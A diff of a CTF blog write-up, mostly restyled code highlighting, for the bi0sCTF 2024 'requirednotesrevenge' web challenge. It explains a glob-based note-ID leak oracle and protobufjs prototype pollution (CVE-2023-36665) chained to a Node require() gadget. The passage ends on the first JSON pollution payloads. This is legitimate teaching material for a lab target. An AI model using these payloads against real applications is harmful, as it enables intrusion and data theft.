@@ -106,7 +106,7 @@
     
     
 
-<link type="text/css" rel="stylesheet" href="/css/bundle.min.e2cd7bb31175229efffd2db21407e5f6ecab44bbd0fcaef56c6905dc3285f85e.css">
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.0116cf0f609eb527b85b49d8ffe467707a64be5e30ae09f6e6ca742edf46e161.css">
 
 
     
@@ -426,135 +426,135 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 Download files from: <a href="https://github.com/teambi0s/bi0sCTF/tree/main/2024/Web/requirednotesrevenge/handout" target="_blank">link</a></p>
 <h2 id="analysis">Analysis</h2>
 <p>Lets take a quick look at all the routes that are available to us:</p>
-<pre tabindex="0"><code>/delete -  Runs cleanserver() function which deletes require.cache.
-/search/:noteId - Searches for given noteId. This endpoint uses restrictToLocalhost middleware which restricts access to localhost.
-/customise - To edit the protobuf configuration file. User input is directly written to settings.proto file.
-/create - Create a new note which after validation with protobuf is stored into a file /note/noteId.json where noteId is randomly generated.
-/view/:noteId - To view the generated note and delete them.
-/healthcheck - run the healthcheck() function inside bot.js which visits /view/Healthcheck.
-</code></pre><p>The healthcheck note and flag note are generated when the application starts.</p>
-<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">...
-let flag = process.env.FLAG;
-if(!flag){
-  flag=&#39;{&#34;title&#34;:&#34;flag&#34;,&#34;content&#34;:&#34;bi0sctf{fake_flag}&#34;}&#39;;
-}
-else{
-  flag=`{&#34;title&#34;:&#34;flag&#34;,&#34;content&#34;:&#34;${flag}&#34;}`;
-}
-const flagid = generateNoteId(16);
-const healthCheckId=&#39;Healthcheck&#39;;
-fs.writeFileSync(`./notes/${flagid}.json`, flag);
-fs.writeFileSync(`./notes/${healthCheckId}.json`, &#39;{&#34;title&#34;:&#34;Healthcheck&#34;,&#34;content&#34;:&#34;success&#34;}&#39;);
-...
-</code></pre><p>The flag is in a file within notes directory with a random id as the name.</p>
-<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">function generateNoteId(length) {
-  const characters = &#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;;
-  let result = &#39;&#39;;
-  for (let i = 0; i &lt; length; i++) {
-    const randomIndex = crypto.randomInt(characters.length);
-    result += characters.charAt(randomIndex);
-  }
-  return result;
-}
-...
-</code></pre><p>Apart from an index.js, there is also a bot.js which contains code for the admin bot. It sets Javascript execution off and only visits the Healthcheck note.</p>
-<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">...
-const page = await browser.newPage();
-await page.setJavaScriptEnabled(false)
-const response=await page.goto(&#34;http://localhost:3000/view/Healthcheck&#34;)
-await browser.close();
-...
-</code></pre><p>Problem number 1 is that unlike typical XSS challenges where admin bot visits a url with attacker content, here the bot only vists a pre-set url. The content of Healthcheck note is not under our control. Or is it?
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>/delete -  Runs cleanserver() function which deletes require.cache.
+</span></span><span style="display:flex;"><span>/search/:noteId - Searches for given noteId. This endpoint uses restrictToLocalhost middleware which restricts access to localhost.
+</span></span><span style="display:flex;"><span>/customise - To edit the protobuf configuration file. User input is directly written to settings.proto file.
+</span></span><span style="display:flex;"><span>/create - Create a new note which after validation with protobuf is stored into a file /note/noteId.json where noteId is randomly generated.
+</span></span><span style="display:flex;"><span>/view/:noteId - To view the generated note and delete them.
+</span></span><span style="display:flex;"><span>/healthcheck - run the healthcheck() function inside bot.js which visits /view/Healthcheck.
+</span></span></code></pre></div><p>The healthcheck note and flag note are generated when the application starts.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">flag</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">FLAG</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">flag</span>){
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">flag</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;{&#34;title&#34;:&#34;flag&#34;,&#34;content&#34;:&#34;bi0sctf{fake_flag}&#34;}&#39;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">flag</span><span style="color:#f92672">=</span><span style="color:#e6db74">`{&#34;title&#34;:&#34;flag&#34;,&#34;content&#34;:&#34;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">flag</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;}`</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">flagid</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">generateNoteId</span>(<span style="color:#ae81ff">16</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">healthCheckId</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Healthcheck&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">writeFileSync</span>(<span style="color:#e6db74">`./notes/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">flagid</span><span style="color:#e6db74">}</span><span style="color:#e6db74">.json`</span>, <span style="color:#a6e22e">flag</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">writeFileSync</span>(<span style="color:#e6db74">`./notes/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">healthCheckId</span><span style="color:#e6db74">}</span><span style="color:#e6db74">.json`</span>, <span style="color:#e6db74">&#39;{&#34;title&#34;:&#34;Healthcheck&#34;,&#34;content&#34;:&#34;success&#34;}&#39;</span>);
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>The flag is in a file within notes directory with a random id as the name.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">generateNoteId</span>(<span style="color:#a6e22e">length</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">characters</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">randomIndex</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">randomInt</span>(<span style="color:#a6e22e">characters</span>.<span style="color:#a6e22e">length</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">result</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">characters</span>.<span style="color:#a6e22e">charAt</span>(<span style="color:#a6e22e">randomIndex</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">result</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Apart from an index.js, there is also a bot.js which contains code for the admin bot. It sets Javascript execution off and only visits the Healthcheck note.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">page</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">browser</span>.<span style="color:#a6e22e">newPage</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">setJavaScriptEnabled</span>(<span style="color:#66d9ef">false</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">response</span><span style="color:#f92672">=</span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#66d9ef">goto</span>(<span style="color:#e6db74">&#34;http://localhost:3000/view/Healthcheck&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">browser</span>.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Problem number 1 is that unlike typical XSS challenges where admin bot visits a url with attacker content, here the bot only vists a pre-set url. The content of Healthcheck note is not under our control. Or is it?
 Problem number 2 is that javascript execution is disabled.</p>
 <!-- raw HTML omitted -->
 <p>Lets tackle problem number 2 first. Looking closer at the /search endpoint, we can discover a leak oracle.</p>
-<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">app.get(&#39;/search/:noteId&#39;, (req, res) =&gt; {
-  const noteId = req.params.noteId;
-  const notes=glob.sync(`./notes/${noteId}*`);
-  if(notes.length === 0){
-    return res.json({Message: &#34;Not found&#34;});
-  }
-  else{
-    try{
-      fs.accessSync(`./notes/${noteId}.json`);
-      return res.json({Message: &#34;Note found&#34;});
-    }
-    catch(err){
-      return res.status(500).json({ Message: &#39;Internal server error&#39; });
-    }
-  }
-
-})
-</code></pre><p>The <code>/search/</code> endpoint uses the glob module with <code>./notes/${noteId}*</code> which can be used to search for a noteId character by character. Lets say if a noteId <code>abcd.json</code> exists and we send a request to <code>/search/a</code>, notes.length becomes 1 but <code>fs.accessSync(./notes/a.json)</code> will throw an error since a.json is not a valid noteId and it will return status 500. Instead if note searched was <code>/search/b</code> then glob.sync will set notes.length 0 and return status code 200 with message &ldquo;Not found&rdquo;.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/search/:noteId&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">noteId</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">params</span>.<span style="color:#a6e22e">noteId</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">notes</span><span style="color:#f92672">=</span><span style="color:#a6e22e">glob</span>.<span style="color:#a6e22e">sync</span>(<span style="color:#e6db74">`./notes/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">noteId</span><span style="color:#e6db74">}</span><span style="color:#e6db74">*`</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">notes</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">0</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({<span style="color:#a6e22e">Message</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Not found&#34;</span>});
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>{
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">accessSync</span>(<span style="color:#e6db74">`./notes/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">noteId</span><span style="color:#e6db74">}</span><span style="color:#e6db74">.json`</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({<span style="color:#a6e22e">Message</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Note found&#34;</span>});
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">err</span>){
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">Message</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Internal server error&#39;</span> });
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>})
+</span></span></code></pre></div><p>The <code>/search/</code> endpoint uses the glob module with <code>./notes/${noteId}*</code> which can be used to search for a noteId character by character. Lets say if a noteId <code>abcd.json</code> exists and we send a request to <code>/search/a</code>, notes.length becomes 1 but <code>fs.accessSync(./notes/a.json)</code> will throw an error since a.json is not a valid noteId and it will return status 500. Instead if note searched was <code>/search/b</code> then glob.sync will set notes.length 0 and return status code 200 with message &ldquo;Not found&rdquo;.</p>
 <p>We&rsquo;ll take a look at how to exploit this later on but there is one more condition(middleware) set on the /search endpoint that we need to keep in mind.</p>
-<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">const restrictToLocalhost = (req, res, next) =&gt; {
-  const remoteAddress = req.connection.remoteAddress;
-  if (remoteAddress === &#39;::1&#39; || remoteAddress === &#39;127.0.0.1&#39; || remoteAddress === &#39;::ffff:127.0.0.1&#39;) {
-    next();
-  } else {
-    res.status(403).json({ Message: &#39;Access denied&#39; });
-  }
-};
-...
-
-...
-app.use(&#39;/search&#39;, restrictToLocalhost);
-</code></pre><p>The search endpoint is only accessible by localhost.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">restrictToLocalhost</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">remoteAddress</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">connection</span>.<span style="color:#a6e22e">remoteAddress</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">remoteAddress</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;::1&#39;</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">remoteAddress</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">remoteAddress</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;::ffff:127.0.0.1&#39;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">next</span>();
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">403</span>).<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">Message</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Access denied&#39;</span> });
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#39;/search&#39;</span>, <span style="color:#a6e22e">restrictToLocalhost</span>);
+</span></span></code></pre></div><p>The search endpoint is only accessible by localhost.
 Hence we need to find a way to make use of the admin bot to utilize the oracle in <code>/search</code> endpoint to leak flag note id.</p>
 <hr>
 <!-- raw HTML omitted -->
 <p>The challenge uses protobufjs 7.2.3 which has a prototype pollution CVE <a href="https://www.code-intelligence.com/blog/cve-protobufjs-prototype-pollution-cve-2023-36665" target="_blank">https://www.code-intelligence.com/blog/cve-protobufjs-prototype-pollution-cve-2023-36665</a>
 Calling protobuf.parse() with attacker controlled schema is possible due to the file write to settings.proto in the <code>/customise</code> endpoint</p>
-<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">const { data } = req.body;
-
-    let author = data.pop()[&#39;author&#39;];
-
-    let title = data.pop()[&#39;title&#39;];
-
-    let protoContents = fs.readFileSync(&#39;./settings.proto&#39;, &#39;utf-8&#39;).split(&#39;\n&#39;);
-...
-
-...
-if (author) {
-      protoContents[5] = `  ${author} string author = 3 [default=&#34;user&#34;];`;
-    }
-
-    if (title) {
-      protoContents[3] = `  ${title} string title = 1 [default=&#34;user&#34;];`;
-    }
-fs.writeFileSync(&#39;./settings.proto&#39;, protoContents.join(&#39;\n&#39;), &#39;utf-8&#39;);
-</code></pre><p>The endpoint takes author and title in an array called data and writes whatever is sent into the file <code>settings.proto</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">data</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">author</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">pop</span>()[<span style="color:#e6db74">&#39;author&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">title</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">pop</span>()[<span style="color:#e6db74">&#39;title&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">protoContents</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">readFileSync</span>(<span style="color:#e6db74">&#39;./settings.proto&#39;</span>, <span style="color:#e6db74">&#39;utf-8&#39;</span>).<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;\n&#39;</span>);
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">author</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">protoContents</span>[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">`  </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">author</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> string author = 3 [default=&#34;user&#34;];`</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">title</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">protoContents</span>[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">`  </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">title</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> string title = 1 [default=&#34;user&#34;];`</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">writeFileSync</span>(<span style="color:#e6db74">&#39;./settings.proto&#39;</span>, <span style="color:#a6e22e">protoContents</span>.<span style="color:#a6e22e">join</span>(<span style="color:#e6db74">&#39;\n&#39;</span>), <span style="color:#e6db74">&#39;utf-8&#39;</span>);
+</span></span></code></pre></div><p>The endpoint takes author and title in an array called data and writes whatever is sent into the file <code>settings.proto</code>.</p>
 <p>| Note: a few filters were added here to minimize the playing field for prototype pollution gadgets but players still managed to bypass them :slightly_smiling_face: .</p>
 <p>At <code>/create</code>, protobuf.parse() is called. which ends up polluting the prototype.</p>
-<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">app.post(&#39;/create&#39;, (req, res) =&gt; {
-  requestBody=req.body
-  try{
-    schema = fs.readFileSync(&#39;./settings.proto&#39;, &#39;utf-8&#39;);
-    root = protobuf.parse(schema).root;
-    Note = root.lookupType(&#39;Note&#39;);
-    errMsg = Note.verify(requestBody);
-...
-</code></pre><!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/create&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">requestBody</span><span style="color:#f92672">=</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">schema</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">readFileSync</span>(<span style="color:#e6db74">&#39;./settings.proto&#39;</span>, <span style="color:#e6db74">&#39;utf-8&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">root</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">protobuf</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">schema</span>).<span style="color:#a6e22e">root</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Note</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">root</span>.<span style="color:#a6e22e">lookupType</span>(<span style="color:#e6db74">&#39;Note&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">errMsg</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Note</span>.<span style="color:#a6e22e">verify</span>(<span style="color:#a6e22e">requestBody</span>);
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><!-- raw HTML omitted -->
 <p>Now that we have prototype pollution, we can make use of that to pollute some properties that will load an attacker note instead of Healthcheck note when admin bot visits.</p>
 <p>One such gadget can be seen in  nodejs require function. <a href="https://github.com/nodejs/node/blob/v20.2.0/lib/internal/modules/cjs/loader.js#L529" target="_blank">https://github.com/nodejs/node/blob/v20.2.0/lib/internal/modules/cjs/loader.js#L529</a> which lets us use <code>__proto__.path</code>, <code>__proto__.data.name</code> and <code>__proto__.data.exports</code> to load a &ldquo;malicious&rdquo; module/file specified in exports whenever require(&rsquo;name&rsquo;) is called.</p>
-<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">...
-function trySelf(parentPath, request) {
-  if (!parentPath) return false;
-
-  const { data: pkg, path: pkgPath } = readPackageScope(parentPath) || {};
-  if (!pkg || pkg.exports === undefined) return false;
-  if (typeof pkg.name !== &#39;string&#39;) return false;
-
-  let expansion;
-  if (request === pkg.name) {
-    expansion = &#39;.&#39;;
-  } else if (StringPrototypeStartsWith(request, `${pkg.name}/`)) {
-    expansion = &#39;.&#39; + StringPrototypeSlice(request, pkg.name.length);
-  } else {
-    return false;
-  }
-...
-</code></pre><p>readPackageScope is a function which looks for the package.json which contains details about modules to load but in this particular challenge, the package.json is deleted which makes the function return undefined.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">trySelf</span>(<span style="color:#a6e22e">parentPath</span>, <span style="color:#a6e22e">request</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">parentPath</span>) <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">data</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">pkg</span>, <span style="color:#a6e22e">path</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">pkgPath</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">readPackageScope</span>(<span style="color:#a6e22e">parentPath</span>) <span style="color:#f92672">||</span> {};
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">pkg</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">pkg</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">undefined</span>) <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">pkg</span>.<span style="color:#a6e22e">name</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;string&#39;</span>) <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">expansion</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">request</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">pkg</span>.<span style="color:#a6e22e">name</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">expansion</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;.&#39;</span>;
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">StringPrototypeStartsWith</span>(<span style="color:#a6e22e">request</span>, <span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">pkg</span>.<span style="color:#a6e22e">name</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/`</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">expansion</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">StringPrototypeSlice</span>(<span style="color:#a6e22e">request</span>, <span style="color:#a6e22e">pkg</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">length</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>readPackageScope is a function which looks for the package.json which contains details about modules to load but in this particular challenge, the package.json is deleted which makes the function return undefined.</p>
 <p>pkg.exports and pkg.name, now undefined, is taken from the prototype. This has been described in much better detail in the following blogs and I&rsquo;d recommend giving them a read.
 <a href="https://ctf.zeyu2001.com/2022/balsnctf-2022/2linenodejs" target="_blank">https://ctf.zeyu2001.com/2022/balsnctf-2022/2linenodejs</a>
 <a href="https://oatmeal.vip/security/web-learning/balsn-ctf-20222linenodejs/" target="_blank">https://oatmeal.vip/security/web-learning/balsn-ctf-20222linenodejs/</a></p>
@@ -565,34 +565,34 @@ function trySelf(parentPath, request) {
 <li>Attacker note contains payload which leaks flag id using <code>/search</code> endpoint.</li>
 </ul>
 <p>Let&rsquo;s take a closer look at how we can achieve this.</p>
-<pre tabindex="0"><code class="language-jsonld" data-lang="jsonld">{&#34;data&#34;:[{&#34;title&#34;:&#34;option(a).constructor.prototype.data={};optional&#34;},{&#34;author&#34;:&#34;optional&#34;}]}
-{&#34;data&#34;:[{&#34;title&#34;:&#34;option(a).constructor.prototype.data.name=\&#34;./notes/Healthcheck\&#34;;optional&#34;},{&#34;author&#34;:&#34;optional&#34;}]}
-{&#34;data&#34;:[{&#34;title&#34;:&#34;option(a).constructor.prototype.data.exports=\&#34;./notes/di1k8m47ob.json\&#34;;optional&#34;},{&#34;author&#34;:&#34;optional&#34;}]}
